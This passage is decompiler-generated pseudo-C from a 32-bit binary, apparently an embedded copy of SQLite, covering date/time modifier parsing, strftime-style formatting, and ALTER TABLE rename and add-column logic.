    v23 = *(_QWORD *)a2 + 86400000 * (int)&v36[-*(_QWORD *)&v35];
    goto LABEL_64;
  }
  if ( !strcmp(&v30, aUnixepoch) && *((_BYTE *)a2 + 42) )
  {
    v23 = (*(_QWORD *)a2 + 43200i64) / 86400 + 210866760000000i64;
LABEL_64:
    *(_QWORD *)a2 = v23;
    goto LABEL_52;
  }
  if ( !strcmp(&v30, aUtc) )
  {
    sub_10073D0C((int)a2);
    v24 = sub_100740F4(a2);
    v25 = v24;
    v7 = *a2 < (unsigned int)v24;
    *a2 -= v24;
    HIDWORD(v34) = HIDWORD(v24);
    a2[1] -= v7 + HIDWORD(v24);
    *((_BYTE *)a2 + 40) = 0;
    *((_BYTE *)a2 + 41) = 0;
    *((_BYTE *)a2 + 43) = 0;
    v26 = sub_100740F4(a2);
    v27 = v25 - v26;
    v8 = (__PAIR64__(HIDWORD(v34), v25) - v26) >> 32;
    v7 = __CFADD__(v27, *a2);
    *a2 += v27;
LABEL_16:
    a2[1] += v8 + v7;
    return 0;
  }
  return v38;
}
// 10074343: variable 'v11' is possibly undefined
// 100741F2: using guessed type double var_18;

//----- (1007475A) --------------------------------------------------------
int __usercall sub_1007475A@<eax>(_BYTE *a1@<eax>, int a2, int a3, int *a4)
{
  int v5; // eax
  char *v6; // eax
  int v8; // esi
  _BYTE *v9; // eax

  memset(a1, 0, 0x30u);
  if ( a3 )
  {
    v5 = *(unsigned __int8 *)(*a4 + 30);
    if ( v5 == 2 || v5 == 1 )
    {
      *(_QWORD *)a1 = (unsigned __int64)(sub_1005A0AF(*a4) * 86400000.0 + 0.5);
      a1[42] = 1;
    }
    else
    {
      v6 = (char *)sub_100530C6(*a4);
      if ( !v6 || sub_10073EE8(v6, (int)a1, a2) )
        return 1;
    }
  }
  else
  {
    sub_10073EB5(a2, (int)a1);
  }
  v8 = 1;
  if ( a3 > 1 )
  {
    while ( 1 )
    {
      v9 = (_BYTE *)sub_100530C6(a4[v8]);
      if ( !v9 || sub_100741F2(v9, a1) )
        break;
      if ( ++v8 >= a3 )
        return 0;
    }
    return 1;
  }
  return 0;
}

//----- (10074800) --------------------------------------------------------
__int16 __cdecl sub_10074800(int a1, __int64 a2)
{
  int v2; // eax
  __int64 v4[6]; // [esp+10h] [ebp-30h] BYREF

  v2 = sub_1007475A(v4, a1, a2, (int *)HIDWORD(a2));
  if ( !v2 )
  {
    sub_10073D0C((int)v4);
    LOWORD(v2) = sub_1005310E(a1, (double)v4[0] / 86400000.0);
  }
  return v2;
}

//----- (1007484A) --------------------------------------------------------
int __cdecl sub_1007484A(int a1, int a2, int *a3)
{
  int result; // eax
  char v4[8]; // [esp+8h] [ebp-98h] BYREF
  int v5; // [esp+10h] [ebp-90h]
  int v6; // [esp+14h] [ebp-8Ch]
  int v7; // [esp+18h] [ebp-88h]
  int v8; // [esp+1Ch] [ebp-84h]
  int v9; // [esp+20h] [ebp-80h]
  double v10; // [esp+28h] [ebp-78h]
  char Src[104]; // [esp+38h] [ebp-68h] BYREF

  result = sub_1007475A(v4, a1, a2, a3);
  if ( !result )
  {
    sub_10073F6B((int)v4);
    sub_10074061((int)v4);
    sub_10055543(100, (int)Src, "%04d-%02d-%02d %02d:%02d:%02d", v5, v6, v7, v8, v9, (int)v10);
    result = sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, a1 + 8, -1, Src, 1);
    if ( result == 18 )
      return sub_10053178(a1);
  }
  return result;
}

//----- (100748DC) --------------------------------------------------------
int __cdecl sub_100748DC(int a1, int a2, int *a3)
{
  int result; // eax
  char v4[20]; // [esp+8h] [ebp-98h] BYREF
  int v5; // [esp+1Ch] [ebp-84h]
  int v6; // [esp+20h] [ebp-80h]
  double v7; // [esp+28h] [ebp-78h]
  char Src[104]; // [esp+38h] [ebp-68h] BYREF

  result = sub_1007475A(v4, a1, a2, a3);
  if ( !result )
  {
    sub_10074061((int)v4);
    sub_10055543(100, (int)Src, "%02d:%02d:%02d", v5, v6, (int)v7);
    result = sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, a1 + 8, -1, Src, 1);
    if ( result == 18 )
      return sub_10053178(a1);
  }
  return result;
}

//----- (10074957) --------------------------------------------------------
int __cdecl sub_10074957(int a1, int a2, int *a3)
{
  int result; // eax
  char v4[8]; // [esp+8h] [ebp-98h] BYREF
  int v5; // [esp+10h] [ebp-90h]
  int v6; // [esp+14h] [ebp-8Ch]
  int v7; // [esp+18h] [ebp-88h]
  char Src[104]; // [esp+38h] [ebp-68h] BYREF

  result = sub_1007475A(v4, a1, a2, a3);
  if ( !result )
  {
    sub_10073F6B((int)v4);
    sub_10055543(100, (int)Src, "%04d-%02d-%02d", v5, v6, v7);
    result = sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, a1 + 8, -1, Src, 1);
    if ( result == 18 )
      return sub_10053178(a1);
  }
  return result;
}

//----- (100749CE) --------------------------------------------------------
int __cdecl sub_100749CE(int a1, int a2, int *a3)
{
  int result; // eax
  _BYTE *v4; // edi
  int v5; // ecx
  int v6; // ebx
  unsigned int v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  bool v14; // cf
  int v15; // kr00_4
  char *v16; // edi
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  char *v22; // eax
  int v23; // ebx
  char v24; // al
  char *v25; // esi
  __int64 v26; // st7
  void (__cdecl *v27)(int, unsigned int); // eax
  int v28; // [esp-8h] [ebp-F8h]
  char *v29; // [esp-4h] [ebp-F4h]
  double v30; // [esp+0h] [ebp-F0h]
  char *v31; // [esp+18h] [ebp-D8h]
  char v32; // [esp+1Fh] [ebp-D1h]
  char *v33; // [esp+20h] [ebp-D0h]
  __int64 v34[6]; // [esp+28h] [ebp-C8h] BYREF
  __int64 v35[6]; // [esp+58h] [ebp-98h] BYREF
  char v36[104]; // [esp+88h] [ebp-68h] BYREF

  result = sub_100530C6(*a3);
  v4 = (_BYTE *)result;
  v31 = (char *)result;
  if ( !result )
    return result;
  result = sub_1007475A(v34, a1, a2 - 1, a3 + 1);
  if ( result )
    return result;
  v5 = 0;
  v6 = 1;
  v7 = 0;
  if ( !*v4 )
    goto LABEL_18;
  do
  {
    if ( v4[v5] != 37 )
      goto LABEL_16;
    v8 = (char)v4[v5 + 1];
    if ( v8 > 89 )
    {
      v17 = v8 - 100;
      if ( !v17 )
        goto LABEL_13;
      v18 = v17 - 2;
      if ( !v18 )
      {
LABEL_19:
        v14 = __CFADD__(v6, 8);
        v6 += 8;
        goto LABEL_14;
      }
      v19 = v18 - 4;
      if ( !v19 )
      {
        v14 = __CFADD__(v6, 3);
        v6 += 3;
        goto LABEL_14;
      }
      v20 = v19 - 3;
      if ( !v20 )
        goto LABEL_13;
      v21 = v20 - 6;
      if ( v21 )
      {
        result = v21 - 4;
        if ( result )
          return result;
        goto LABEL_15;
      }
LABEL_27:
      v14 = __CFADD__(v6, 50);
      v6 += 50;
      goto LABEL_14;
    }
    if ( v8 == 89 )
      goto LABEL_19;
    v9 = v8 - 37;
    if ( v9 )
    {
      v10 = v9 - 35;
      if ( !v10 )
        goto LABEL_13;
      v11 = v10 - 2;
      if ( v11 )
      {
        v12 = v11 - 3;
        if ( v12 )
        {
          v13 = v12 - 6;
          if ( v13 )
          {
            result = v13 - 4;
            if ( result )
              return result;
          }
        }
LABEL_13:
        v14 = __CFADD__(v6++, 1);
LABEL_14:
        v7 += v14;
        goto LABEL_15;
      }
      goto LABEL_27;
    }
LABEL_15:
    ++v5;
LABEL_16:
    ++v5;
    v15 = v6 + 1;
    v7 = (__PAIR64__(v7, v6++) + 1) >> 32;
  }
  while ( v4[v5] );
  if ( __PAIR64__(v7, v15) < 0x64 )
  {
LABEL_18:
    v16 = v36;
    v33 = v36;
    goto LABEL_34;
  }
  if ( __PAIR64__(v7, v15) > *(int *)(*(_DWORD *)(a1 + 24) + 72) )
    return sub_10053178(a1);
  v22 = (char *)sub_10059073(*(_DWORD *)(a1 + 24), v15);
  v33 = v22;
  if ( !v22 )
    return sub_10053198(a1);
  v16 = v22;
LABEL_34:
  sub_10073D0C((int)v34);
  sub_10073F6B((int)v34);
  sub_10074061((int)v34);
  v23 = 0;
  if ( *v31 )
  {
    while ( 2 )
    {
      v24 = *v31;
      if ( *v31 == 37 )
      {
        v32 = *++v31;
        if ( *v31 <= 100 )
        {
          switch ( v32 )
          {
            case 'd':
              sub_10055543(3, (int)&v16[v23], a02d_2);
              break;
            case 'H':
              sub_10055543(3, (int)&v16[v23], a02d_1);
              break;
            case 'J':
              v30 = (double)v34[0] / 86400000.0;
              v29 = a16g;
              v28 = 20;
LABEL_70:
              v25 = &v16[v23];
              sub_10055543(v28, (int)&v16[v23], v29, v30);
LABEL_71:
              v23 += (int)sub_10059297(v25);
              goto LABEL_72;
            default:
              switch ( v32 )
              {
                case 'M':
                  sub_10055543(3, (int)&v16[v23], a02d_0, LODWORD(v34[3]));
                  break;
                case 'S':
                  sub_10055543(3, (int)&v16[v23], a02d, (int)*(double *)&v34[4]);
                  break;
                case 'W':
LABEL_63:
                  qmemcpy(v35, v34, sizeof(v35));
                  BYTE2(v35[5]) = 0;
                  HIDWORD(v35[1]) = 1;
                  LODWORD(v35[2]) = 1;
                  sub_10073D0C((int)v35);
                  if ( v32 == 87 )
                  {
                    sub_10055543(
                      3,
                      (int)&v33[v23],
                      "%02d",
                      (int)((v34[0] - v35[0] + 43200000) / 86400000 - (v34[0] + 43200000) / 86400000 % 7 + 7) / 7);
                    v23 += 2;
                  }
                  else
                  {
                    sub_10055543(4, (int)&v33[v23], "%03d", (unsigned int)((v34[0] - v35[0] + 43200000) / 86400000) + 1);
                    v23 += 3;
                  }
                  v16 = v33;
                  goto LABEL_72;
                case 'Y':
                  v25 = &v16[v23];
                  sub_10055543(5, (int)&v16[v23], "%04d", LODWORD(v34[1]));
                  goto LABEL_71;
                default:
LABEL_57:
                  v16[v23] = 37;
LABEL_60:
                  ++v23;
LABEL_72:
                  if ( !*++v31 )
                    goto LABEL_73;
                  continue;
              }
              v23 += 2;
              goto LABEL_72;
          }
LABEL_51:
          v23 += 2;
          goto LABEL_72;
        }
        switch ( v32 )
        {
          case 'f':
            v26 = v34[4];
            if ( *(double *)&v34[4] > 59.999 )
              *(double *)&v26 = 59.999;
            v30 = *(double *)&v26;
            v29 = a063f;
            v28 = 7;
            goto LABEL_70;
          case 'j':
            goto LABEL_63;
          case 'm':
            sub_10055543(3, (int)&v16[v23], a02d_3);
            goto LABEL_51;
          case 's':
            v25 = &v16[v23];
            sub_10055543(30, (int)&v16[v23], aLld_0, v34[0] / 1000 - 210866760000i64);
            goto LABEL_71;
        }
        if ( v32 != 119 )
          goto LABEL_57;
        v24 = (v34[0] + 129600000) / 86400000 % 7 + 48;
      }
      break;
    }
    v16[v23] = v24;
    goto LABEL_60;
  }
LABEL_73:
  v16[v23] = 0;
  v27 = (void (__cdecl *)(int, unsigned int))-1;
  if ( v16 != v36 )
    v27 = sub_10058EC7;
  return sub_100530EC(v27, -1, a1, v16, 1);
}
// 10074A6B: conditional instruction was optimized away because edx.4==0

//----- (10074E1D) --------------------------------------------------------
int __cdecl sub_10074E1D(int a1, int a2, int *a3)
{
  int v3; // ebx
  int result; // eax
  unsigned __int8 *v5; // edi
  _BYTE *v6; // eax
  int v7; // [esp+10h] [ebp-Ch]
  int v8; // [esp+14h] [ebp-8h]
  int v9; // [esp+18h] [ebp-4h] BYREF
  unsigned __int8 *v10; // [esp+2Ch] [ebp+10h]

  v3 = sub_100530C6(*a3);
  v8 = sub_100530C6(a3[1]);
  result = 0;
  v10 = (unsigned __int8 *)v3;
  if ( v3 )
  {
    while ( 1 )
    {
      v5 = v10;
      if ( !*v10 )
        break;
      v7 = result;
      do
      {
        v10 += result;
        result = sub_1007196C(v10, &v9);
      }
      while ( v9 == 149 );
      if ( v9 == 22 || v9 == 121 )
      {
        v6 = (_BYTE *)sub_10055484(*(_DWORD *)(a1 + 24), aSWS, &v5[-v3], v3, v8, &v5[v7]);
        return sub_100530EC(sub_10058EC7, -1, a1, v6, 1);
      }
    }
  }
  return result;
}

//----- (10074EB0) --------------------------------------------------------
void __cdecl sub_10074EB0(int a1, int a2, int *a3)
{
  int v3; // eax
  unsigned __int8 *v5; // ebx
  int v6; // edi
  char *v7; // ecx
  unsigned __int8 *v8; // ecx
  void *v9; // eax
  int v10; // esi
  const char *v11; // eax
  _BYTE *v12; // eax
  int v13; // [esp-4h] [ebp-28h]
  unsigned int v14; // [esp+Ch] [ebp-18h]
  int v15; // [esp+10h] [ebp-14h]
  unsigned __int8 *v16; // [esp+14h] [ebp-10h]
  int v17; // [esp+18h] [ebp-Ch] BYREF
  int v18; // [esp+1Ch] [ebp-8h]
  void *v19; // [esp+20h] [ebp-4h]
  const char *v20; // [esp+34h] [ebp+10h]

  v3 = *(_DWORD *)(a1 + 24);
  v19 = 0;
  v13 = *a3;
  v18 = v3;
  v5 = (unsigned __int8 *)sub_100530C6(v13);
  v20 = (const char *)v5;
  v16 = (unsigned __int8 *)sub_100530C6(a3[1]);
  v15 = sub_100530C6(a3[2]);
  if ( !*v5 )
  {
LABEL_12:
    v11 = (const char *)&unk_10186490;
    goto LABEL_13;
  }
  while ( 1 )
  {
    v6 = sub_1007196C(v5, &v17);
    if ( v17 == 102 )
      break;
LABEL_10:
    v5 += v6;
    if ( !*v5 )
      goto LABEL_11;
  }
  do
  {
    v5 += v6;
    v6 = sub_1007196C(v5, &v17);
  }
  while ( v17 == 149 );
  v7 = (char *)sub_100591D0(v18, v6, v5);
  v14 = (unsigned int)v7;
  if ( v7 )
  {
    sub_10059363(v7);
    if ( !sub_100593BE(v16, v8) )
    {
      v9 = v19;
      if ( !v19 )
        v9 = &unk_1018643B;
      v10 = sub_10055484(v18, aSSW, v9, v5 - (unsigned __int8 *)v20, v20, v15);
      sub_10058EC7(v18, (unsigned int)v19);
      v19 = (void *)v10;
      v20 = (const char *)&v5[v6];
    }
    sub_10058EC7(v18, v14);
    goto LABEL_10;
  }
LABEL_11:
  v11 = (const char *)v19;
  if ( !v19 )
    goto LABEL_12;
LABEL_13:
  v12 = (_BYTE *)sub_10055484(v18, "%s%s", v11, v20);
  sub_100530EC(sub_10058EC7, -1, a1, v12, 1);
  sub_10058EC7(v18, (unsigned int)v19);
}
// 10074F41: variable 'v8' is possibly undefined

//----- (10074FEB) --------------------------------------------------------
int __cdecl sub_10074FEB(int a1, int a2, int *a3)
{
  int v3; // ebx
  int result; // eax
  unsigned __int8 *v5; // edi
  _BYTE *v6; // eax
  int v7; // [esp+14h] [ebp-10h]
  int v8; // [esp+18h] [ebp-Ch]
  int v9; // [esp+1Ch] [ebp-8h] BYREF
  int v10; // [esp+20h] [ebp-4h]
  unsigned __int8 *v11; // [esp+34h] [ebp+10h]

  v3 = sub_100530C6(*a3);
  v8 = sub_100530C6(a3[1]);
  result = 0;
  v10 = 3;
  v11 = (unsigned __int8 *)v3;
  if ( v3 )
  {
    while ( 1 )
    {
      v5 = v11;
      if ( !*v11 )
        break;
      v7 = result;
      do
      {
        v11 += result;
        result = sub_1007196C(v11, &v9);
      }
      while ( v9 == 149 );
      ++v10;
      if ( v9 == 118 || v9 == 104 )
        v10 = 0;
      if ( v10 == 2 && (v9 == 135 || v9 == 45 || v9 == 5) )
      {
        v6 = (_BYTE *)sub_10055484(*(_DWORD *)(a1 + 24), aSWS_0, &v5[-v3], v3, v8, &v5[v7]);
        return sub_100530EC(sub_10058EC7, -1, a1, v6, 1);
      }
    }
  }
  return result;
}

//----- (100750A8) --------------------------------------------------------
int __usercall sub_100750A8@<eax>(int a1@<eax>, unsigned int a2, int a3)
{
  int v4; // edi

  if ( !a2 )
    return sub_10055484(a1, aNameQ_1, a3);
  v4 = sub_10055484(a1, aSOrNameQ, a2, a3);
  sub_10058EC7(a1, a2);
  return v4;
}

//----- (100750E9) --------------------------------------------------------
int __usercall sub_100750E9@<eax>(_BYTE *a1@<eax>, int a2@<ecx>)
{
  int v2; // edi
  int *i; // esi
  int v5; // [esp+10h] [ebp-8h]
  int v6; // [esp+14h] [ebp-4h]

  v6 = 0;
  v5 = *(_DWORD *)a1;
  v2 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a1 + 8) + 28);
  if ( *(_DWORD *)(a2 + 68) != v2 )
  {
    for ( i = (int *)sub_1007281E(a1, a2); i; i = (int *)i[8] )
    {
      if ( i[5] == v2 )
        v6 = sub_100750A8(v5, v6, *i);
    }
  }
  return v6;
}

//----- (10075137) --------------------------------------------------------
unsigned __int16 *__usercall sub_10075137@<eax>(int *a1@<eax>, int a2, int a3)
{
  unsigned __int16 *result; // eax
  int i; // ebx
  int v6; // eax
  unsigned __int16 *v7; // [esp-8h] [ebp-20h]
  int v8; // [esp+10h] [ebp-8h]
  int *v9; // [esp+14h] [ebp-4h]

  result = (unsigned __int16 *)sub_1007C271(a1);
  v9 = (int *)result;
  if ( result )
  {
    v8 = sub_1005855F(*a1, *(_DWORD *)(a2 + 68));
    for ( i = sub_1007281E(a1, a2); i; i = *(_DWORD *)(i + 32) )
    {
      v7 = *(unsigned __int16 **)i;
      v6 = sub_1005855F(*a1, *(_DWORD *)(i + 20));
      sub_1005AC02(v9, 102, v6, 0, 0, v7, 0);
    }
    sub_1005AC02(v9, 100, v8, 0, 0, *(unsigned __int16 **)(a2 + 4), 0);
    result = (unsigned __int16 *)sub_10055484(*a1, aTblNameQ_0, a3);
    if ( result )
    {
      sub_1005AC02(v9, 98, v8, 0, 0, result, (_BYTE *)0xFFFFFFFF);
      result = (unsigned __int16 *)sub_100750E9(a1, a2);
      if ( result )
        return (unsigned __int16 *)sub_1005AC02(v9, 98, 1, 0, 0, result, (_BYTE *)0xFFFFFFFF);
    }
  }
  return result;
}

//----- (100751FD) --------------------------------------------------------
void __usercall sub_100751FD(int *a1@<eax>, int a2, int a3)
{
  int v4; // edi
  int *v5; // eax
  unsigned __int8 *v6; // esi
  unsigned __int8 *v7; // eax
  _BYTE *v8; // esi
  int v9; // edi
  int v10; // ecx
  int *v11; // edi
  int v12; // eax
  char *v13; // eax
  int v14; // eax
  int v15; // ecx
  int *i; // edi
  int v17; // [esp+10h] [ebp-20h]
  unsigned int v18; // [esp+10h] [ebp-20h]
  int *v19; // [esp+14h] [ebp-1Ch]
  unsigned __int8 *v20; // [esp+14h] [ebp-1Ch]
  unsigned __int8 *v21; // [esp+18h] [ebp-18h]
  int v22; // [esp+1Ch] [ebp-14h]
  unsigned __int16 *v23; // [esp+20h] [ebp-10h]
  unsigned int v24; // [esp+20h] [ebp-10h]
  int v25; // [esp+24h] [ebp-Ch]
  unsigned __int16 *v26; // [esp+28h] [ebp-8h]
  int v27; // [esp+2Ch] [ebp-4h]

  v4 = *a1;
  v26 = 0;
  v27 = *a1;
  v23 = 0;
  if ( !*(_BYTE *)(*a1 + 30) )
  {
    v5 = sub_10069EB7((int)a1, 0, *(unsigned __int8 **)(a2 + 12), *(unsigned __int8 **)(a2 + 8));
    v25 = (int)v5;
    if ( v5 )
    {
      v22 = sub_1005855F(*a1, v5[17]);
      v6 = *(unsigned __int8 **)(16 * v22 + *(_DWORD *)(v4 + 8));
      v21 = v6;
      v7 = (unsigned __int8 *)sub_1006A297(a3, v4);
      v26 = (unsigned __int16 *)v7;
      if ( v7 )
      {
        if ( sub_10069E40(v4, v7, v6) || sub_10069F30((unsigned __int8 *)v26, v6) )
        {
          sub_10059320(a1, aThereIsAlready_1, v26);
        }
        else
        {
          v8 = *(_BYTE **)(v25 + 4);
          if ( (int)sub_10059297(v8) <= 6 || sub_100593F9(v8, 7, (unsigned __int8 *)aSqlite_3) )
          {
            if ( !sub_1006A3D4((int)a1, v26) )
            {
              if ( *(_DWORD *)(v25 + 28) )
              {
                sub_10059320(a1, aViewSMayNotBeA, *(_DWORD *)(v25 + 4));
              }
              else if ( !sub_1006B423(a1, v25) )
              {
                if ( (*(_BYTE *)(v25 + 34) & 0x10) != 0 )
                {
                  v23 = (unsigned __int16 *)sub_10070E9E(v25, v27);
                  if ( !*(_DWORD *)(**((_DWORD **)v23 + 2) + 76) )
                    v23 = 0;
                }
                v19 = sub_1007C271(a1);
                if ( v19 )
                {
                  sub_1006CB39(a1, v22, v23 != 0);
                  sub_1006AB7A(a1, v22);
                  if ( v23 )
                  {
                    v9 = ++a1[18];
                    sub_1005AC02(v19, 94, 0, v9, 0, v26, 0);
                    sub_1005AC02(v19, 128, v9, 0, 0, v23, (_BYTE *)0xFFFFFFF6);
                    sub_1006CB6D(a1);
                  }
                  v20 = *(unsigned __int8 **)(v25 + 4);
                  v17 = sub_10070AAB(v20, -1);
                  if ( (*(_DWORD *)(v27 + 12) & 0x4000000) != 0 )
                  {
                    v24 = 0;
                    v11 = sub_10080FFF(v10, v25);
                    if ( v11 )
                    {
                      do
                      {
                        v12 = sub_100750A8(*a1, v24, *(_DWORD *)(*v11 + 4));
                        v11 = (int *)v11[3];
                        v24 = v12;
                      }
                      while ( v11 );
                      if ( v12 )
                      {
                        sub_10069DB8((int)a1, aUpdateSqliteMa, v20, v26, v12);
                        sub_10058EC7(v27, v24);
                      }
                    }
                  }
                  v13 = aSqliteTempMast_9;
                  if ( v22 != 1 )
                    v13 = aSqliteMaster_9;
                  sub_10069DB8((int)a1, aUpdateQSSetSql, v21, v13, v26, v26, v26, v26, v26, v17, v20);
                  if ( sub_10069E40(v27, (unsigned __int8 *)aSqliteSequence_0, v21) )
                    sub_10069DB8((int)a1, aUpdateWSqliteS, v21, v26, *(_DWORD *)(v25 + 4));
                  v14 = sub_100750E9(a1, v25);
                  v18 = v14;
                  if ( v14 )
                  {
                    sub_10069DB8((int)a1, aUpdateSqliteTe, v26, v26, v14);
                    sub_10058EC7(v27, v18);
                  }
                  if ( (*(_DWORD *)(v27 + 12) & 0x4000000) != 0 )
                  {
                    for ( i = sub_10080FFF(v15, v25); i; i = (int *)i[3] )
                    {
                      if ( *i != v25 )
                        sub_10075137(a1, *i, *(_DWORD *)(*i + 4));
                    }
                  }
                  sub_10075137(a1, v25, (int)v26);
                }
              }
            }
          }
          else
          {
            sub_10059320(a1, aTableSMayNotBe_1, v8);
          }
        }
      }
    }
  }
  sub_1006C7F7((__int16 *)a2, v27);
  sub_10058EC7(v27, (unsigned int)v26);
}
// 100753B4: variable 'v10' is possibly undefined
// 10075495: variable 'v15' is possibly undefined

//----- (100754F5) --------------------------------------------------------
int *__usercall sub_100754F5@<eax>(int *a1@<eax>, int a2, int a3)
{
  int *result; // eax
  int *v5; // esi
  int v6; // ebx
  int v7; // eax
  int v8; // [esp+10h] [ebp-8h]
  int v9; // [esp+14h] [ebp-4h]

  result = sub_1007C271(a1);
  v5 = result;
  if ( result )
  {
    v9 = sub_10078A55((int)a1);
    v6 = sub_10078A55((int)a1);
    sub_1005AB66((int)v5, 35, a2, v9, 2);
    sub_1005B0F6(a2, v5);
    sub_1005ABE8((int)v5, 7, a3, v6);
    v8 = sub_1005AB66((int)v5, 80, v6, 0, v9);
    sub_1005AB66((int)v5, 36, a2, 2, v6);
    sub_1005AE20(v8, (int)v5);
    v7 = sub_10078A70((int)a1, v9);
    return (int *)sub_10078A70(v7, v6);
  }
  return result;
}

//----- (1007558D) --------------------------------------------------------
unsigned __int16 *__cdecl sub_1007558D(int *a1, int a2)
{
  unsigned __int16 *result; // eax
  bool v3; // zf
  int v4; // edi
  _DWORD *v5; // ebx
  int v6; // eax
  int v7; // ecx
  int v8; // edx
  int v9; // esi
  unsigned __int8 *v10; // ecx
  unsigned __int8 *v11; // esi
  unsigned __int8 *v12; // eax
  _DWORD *v13; // edi
  _BYTE *i; // ecx
  char *v15; // eax
  int *v16; // [esp+Ch] [ebp-1Ch]
  unsigned __int8 *v17; // [esp+10h] [ebp-18h]
  int *v18; // [esp+18h] [ebp-10h] BYREF
  int v19; // [esp+1Ch] [ebp-Ch]
  unsigned __int8 *v20; // [esp+20h] [ebp-8h]
  int v21; // [esp+24h] [ebp-4h]

  result = (unsigned __int16 *)a1;
  v3 = a1[16] == 0;
  v4 = *a1;
  v21 = *a1;
  if ( !v3 || *(_BYTE *)(v4 + 30) )
    return result;
  v5 = (_DWORD *)a1[125];
  v6 = sub_1005855F(v4, v5[17]);
  v7 = *(_DWORD *)(v4 + 8);
  v8 = v5[4];
  v9 = v5[1];
  v19 = v6;
  v10 = *(unsigned __int8 **)(16 * v6 + v7);
  v11 = (unsigned __int8 *)(v9 + 16);
  v18 = (int *)(24 * v5[3] + v8 - 24);
  v17 = v10;
  v20 = (unsigned __int8 *)v18[1];
  v16 = sub_10069E40(v4, v11, v10);
  v12 = v20;
  if ( v20 && *v20 == 98 )
  {
    v20 = 0;
    v12 = 0;
  }
  if ( *((_BYTE *)v18 + 21) )
    return (unsigned __int16 *)sub_10059320(a1, aCannotAddAPrim);
  if ( v5[5] )
    return (unsigned __int16 *)sub_10059320(a1, aCannotAddAUniq);
  if ( (*(_DWORD *)(v21 + 12) & 0x4000000) != 0 && v5[9] && v12 )
    return (unsigned __int16 *)sub_10059320(a1, aCannotAddARefe);
  if ( *((_BYTE *)v18 + 20) )
  {
    if ( !v12 )
      return (unsigned __int16 *)sub_10059320(a1, aCannotAddANotN);
    goto LABEL_18;
  }
  if ( v12 )
  {
LABEL_18:
    if ( sub_1005A876(v21, v12, 1, 98, &v18) )
    {
      result = (unsigned __int16 *)v21;
      *(_BYTE *)(v21 + 30) = 1;
      return result;
    }
    if ( !v18 )
      return (unsigned __int16 *)sub_10059320(a1, aCannotAddAColu);
    sub_1005AA4D(v18);
  }
  v13 = sub_100591D0(v21, *(_DWORD *)(a2 + 4), *(void **)a2);
  if ( v13 )
  {
    for ( i = (char *)v13 + *(_DWORD *)(a2 + 4) - 1;
          i > (_BYTE *)v13 && (*i == 59 || (byte_100FEFC0[(unsigned __int8)*i] & 1) != 0);
          --i )
    {
      *i = 0;
    }
    v15 = aSqliteTempMast_10;
    if ( v19 != 1 )
      v15 = aSqliteMaster_10;
    sub_10069DB8((int)a1, aUpdateWSSetSql, v17, v15, v5[12], v13, v5[12] + 1, v11);
    sub_10058EC7(v21, (unsigned int)v13);
  }
  sub_100754F5(a1, v19, (v20 != 0) + 2);
  return sub_10075137(a1, (int)v16, v16[1]);
}

//----- (10075748) --------------------------------------------------------
void __cdecl sub_10075748(int *a1, int a2)
{
  int *v2; // eax
  int *v3; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // edi
  int v6; // eax
  int v7; // eax
  void *v8; // ecx
  int v9; // esi
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]
  int v13; // [esp+1Ch] [ebp-4h]

  v13 = *a1;
  if ( !*(_BYTE *)(*a1 + 30) )
  {
    v2 = sub_10069EB7((int)a1, 0, *(unsigned __int8 **)(a2 + 12), *(unsigned __int8 **)(a2 + 8));
    v3 = v2;
    if ( v2 )
    {
      if ( (*((_BYTE *)v2 + 34) & 0x10) != 0 )
      {
        sub_10059320(a1, aVirtualTablesM_0);
      }
      else if ( v2[7] )
      {
        sub_10059320(a1, aCannotAddAColu_0);
      }
      else
      {
        v10 = sub_1005855F(v13, v2[17]);
        v4 = sub_1005904B(v13, 0x4Cu);
        v5 = v4;
        if ( v4 )
        {
          a1[125] = (int)v4;
          *((_WORD *)v4 + 16) = 1;
          *v4 = *v3;
          v6 = v3[3];
          v5[3] = v6;
          v5[4] = sub_1005904B(v13, 24 * (8 * ((v6 - 1) / 8) + 8));
          v7 = sub_10055484(v13, "sqlite_altertab_%s", (const char *)v3[1]);
          v8 = (void *)v5[4];
          v5[1] = v7;
          if ( v8 && v7 )
          {
            memcpy(v8, (const void *)v3[4], 24 * v5[3]);
            v11 = 0;
            if ( (int)v5[3] > 0 )
            {
              v12 = 0;
              do
              {
                v9 = v12 + v5[4];
                v12 += 24;
                *(_DWORD *)v9 = sub_10059194(*(_BYTE **)v9);
                ++v11;
                *(_DWORD *)(v9 + 16) = 0;
                *(_DWORD *)(v9 + 12) = 0;
                *(_DWORD *)(v9 + 4) = 0;
                *(_DWORD *)(v9 + 8) = 0;
              }
              while ( v11 < v5[3] );
            }
            v5[17] = *(_DWORD *)(16 * v10 + *(_DWORD *)(v13 + 8) + 12);
            v5[12] = v3[12];
            *((_WORD *)v5 + 16) = 1;
            sub_1006CB39(a1, v10, 0);
            if ( sub_1007C271(a1) )
              sub_1006AB7A(a1, v10);
          }
          else
          {
            *(_BYTE *)(v13 + 30) = 1;
          }
        }
      }
    }
  }
  sub_1006C7F7((__int16 *)a2, v13);
}

//----- (100758D6) --------------------------------------------------------
char __usercall sub_100758D6@<al>(unsigned __int8 *a1@<eax>)
{
  int v1; // ecx
  int v3; // ecx
  int v4; // eax

  while ( 1 )
  {
    v1 = *a1;
    if ( v1 != 116 )
      break;
    a1 = **(unsigned __int8 ***)(**((_DWORD **)a1 + 4) + 12);
  }
  if ( v1 == 37 )
    return sub_1006A7EB(37, *((_BYTE **)a1 + 1));
  if ( v1 != 154 && v1 != 152 && v1 != 132 )
    return a1[1];
  v3 = *((_DWORD *)a1 + 10);
  if ( !v3 )
    return a1[1];
  v4 = *((__int16 *)a1 + 14);
  if ( v4 >= 0 )
    return *(_BYTE *)(*(_DWORD *)(v3 + 16) + 24 * v4 + 22);
  else
    return 100;
}

//----- (10075930) --------------------------------------------------------
int __usercall sub_10075930@<eax>(int a1@<eax>, int *a2@<edi>, int a3@<esi>)
{
  int v3; // ebx
  char *v4; // eax
  int *v5; // eax
  unsigned int v7; // [esp+4h] [ebp-4h]

  v3 = *a2;
